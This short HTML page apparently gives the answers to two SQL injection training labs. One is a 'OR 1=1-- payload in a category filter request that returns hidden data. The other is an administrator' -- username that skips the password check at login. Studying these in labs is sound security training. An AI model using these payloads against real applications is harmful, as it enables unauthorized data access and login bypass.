<h1>SQL Injection Labs</h1>

<h2>1st Lab: SQL injection in WHERE clause (Hidden Data Retrieval)</h2>

<p><b>Answer:</b></p>

<code>GET /filter?category='+OR+1=1-- HTTP/2</code>

<p><b>Why we used OR 1=1:</b><br>
Because <b>F OR T = T</b>, so the condition always becomes true and returns all data.</p>

<hr>

<h2>2nd Lab: SQL injection vulnerability allowing login bypass</h2>

<p><b>Input:</b></p>

<ul>
  <li>username: <code>administrator' --</code></li>
  <li>password: <code>any password</code></li>
</ul>

<p><b>Explanation:</b><br>
The <code>--</code> is used to ignore the rest of the SQL query, so the password check is skipped.</p>
